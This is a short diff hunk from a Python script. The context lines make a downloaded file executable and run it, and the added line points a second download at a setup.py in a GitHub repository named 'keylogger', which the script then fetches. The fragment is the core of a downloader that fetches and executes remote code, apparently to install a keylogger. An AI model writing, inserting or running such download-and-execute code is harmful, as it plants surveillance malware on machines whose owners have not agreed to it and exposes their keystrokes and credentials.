@@ -21,7 +21,7 @@ if response.status_code == 200:
 os.system('chmod +x ' + filename)
 os.system('./' + filename)
 
-url2 = ''
+url2 = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/setup/setup.py'
 filename2 = 'setup.py'
 response2 = requests.get(url2)
 
